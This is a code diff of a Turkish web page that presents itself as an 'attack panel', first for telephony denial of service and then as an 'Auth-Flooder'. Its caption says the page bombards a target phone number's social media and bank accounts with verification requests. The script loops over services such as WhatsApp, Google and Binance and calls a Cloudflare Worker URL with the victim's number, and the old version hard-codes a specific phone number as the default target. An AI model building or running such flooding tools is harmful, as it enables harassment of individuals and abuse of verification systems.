@@ -2,43 +2,58 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Siber Güvenlik | TDoS Saldırı Paneli</title>
+    <title>Siber Güvenlik | Auth-Flood Test Paneli</title>
     <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .terminal { border: 2px solid #00ff41; padding: 40px; box-shadow: 0 0 20px #00ff41; width: 450px; text-align: center; background: rgba(0, 0, 0, 0.9); }
-        h2 { text-transform: uppercase; letter-spacing: 5px; margin-bottom: 30px; }
-        input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; width: 85%; margin-bottom: 25px; font-size: 1.3em; text-align: center; outline: none; }
-        button { background: #00ff41; color: #000; border: none; padding: 15px 35px; cursor: pointer; font-weight: bold; width: 90%; font-size: 1em; transition: all 0.3s; }
-        button:hover { background: #000; color: #00ff41; border: 1px solid #00ff41; box-shadow: 0 0 10px #00ff41; }
-        #log { margin-top: 25px; font-size: 0.85em; color: #00ff41; text-align: left; height: 60px; overflow: hidden; border-top: 1px solid #333; padding-top: 10px; }
-        .success { color: #fff; font-weight: bold; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 500px; background: #000; border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 20px #00ff0055; }
+        h2 { text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 10px; font-size: 18px; }
+        input { width: 100%; background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 10px; box-sizing: border-box; margin: 15px 0; outline: none; }
+        button { width: 100%; background: #00ff00; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #00cc00; transform: scale(1.02); }
+        #output { margin-top: 15px; font-size: 12px; height: 120px; overflow-y: auto; text-align: left; border-top: 1px dashed #00ff00; padding-top: 10px; }
+        .success { color: #fff; background: #004400; padding: 2px 5px; }
     </style>
 </head>
 <body>
     <div class="terminal">
-        <h2>TDoS ATTACK v1.0</h2>
-        <input type="text" id="target" value="05545670469">
-        <button onclick="executeAttack()">SALDIRIYI TETIKLE</button>
-        <div id="log">Sistem IDLE... <br> Bekleniyor...</div>
+        <h2>[ AUTH-FLOODER v1.0 ]</h2>
+        <p style="font-size: 10px;">Hedef numaranın sosyal medya ve banka hesaplarını doğrulama yağmuruna tutun.</p>
+        
+        <input type="text" id="phone" placeholder="Telefon No (Örn: 5051234567)">
+        <button onclick="startAttack()">SALDIRIYI BAŞLAT</button>
+
+        <div id="output">> Sistem hazır. Hedef bekleniyor...</div>
     </div>
 
     <script>
-        async function executeAttack() {
-            const no = document.getElementById('target').value;
-            const log = document.getElementById('log');
-            // Senin verdiğin Worker URL'si
-            const api_url = "https://empty-firefly-af53.alyux.workers.dev/?numara=" + no;
-
-            log.innerHTML = "[>] İstek paketi hazırlandı...<br>[>] Hedef: " + no;
+        async function startAttack() {
+            const numara = document.getElementById('phone').value;
+            const output = document.getElementById('output');
             
-            try {
-                const response = await fetch(api_url);
-                const data = await response.json();
+            if(numara.length < 10) { alert("Geçersiz numara!"); return; }
+
+            output.innerHTML = "";
+            const apps = ["WhatsApp", "Telegram", "Google", "Facebook", "Instagram", "Getir", "Trendyol", "Binance", "Netflix", "Papara"];
+            
+            // Cloudflare Worker URL'ni buraya yapıştır
+            const workerUrl = "https://SENIN_WORKER_URLN.workers.dev?numara=" + numara;
+
+            for(let app of apps) {
+                const p = document.createElement('p');
+                p.innerHTML = `[+] <span class="success">${app}</span> API isteği gönderildi...`;
+                output.appendChild(p);
+                output.scrollTop = output.scrollHeight;
                 
-                log.innerHTML = "<span class='success'>[+] DURUM: " + data.mesaj + "</span><br>[+] 10 Vektör Pipedream'e iletildi!";
-            } catch (error) {
-                log.innerHTML = "<span style='color:red'>[-] HATA: Sunucuya erişilemedi!</span>";
+                // API'yi tetikle
+                fetch(workerUrl).catch(() => {});
+                
+                // Biraz gerçekçilik için bekleme ekleyelim
+                await new Promise(r => setTimeout(r, 400));
             }
+            
+            const final = document.createElement('p');
+            final.innerHTML = "<strong>> İŞLEM TAMAMLANDI. Tüm vektörler ateşlendi.</strong>";
+            output.appendChild(final);
         }
     </script>
 </body>
